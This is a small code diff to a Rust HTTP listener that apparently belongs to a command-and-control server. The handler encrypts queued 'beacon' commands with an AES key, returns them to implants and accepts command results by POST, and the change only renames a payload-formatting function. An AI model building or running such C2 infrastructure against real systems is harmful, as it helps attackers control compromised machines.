@@ -156,11 +156,12 @@ async fn http_listener_handler(req: HttpRequest, info: web::Path<String>, privat
                     }
 
                     if let Ok(json) = serde_json::to_value(&beacon_commands) {
-                        let payload = format_payload(json, aes_key);
+                        let payload = format_beacon_payload(json, aes_key);
                         return HttpResponse::Ok().body(payload);
                     }
                 }
             },
+            
             // POST method for posting results of commands
             "POST" => {
                 
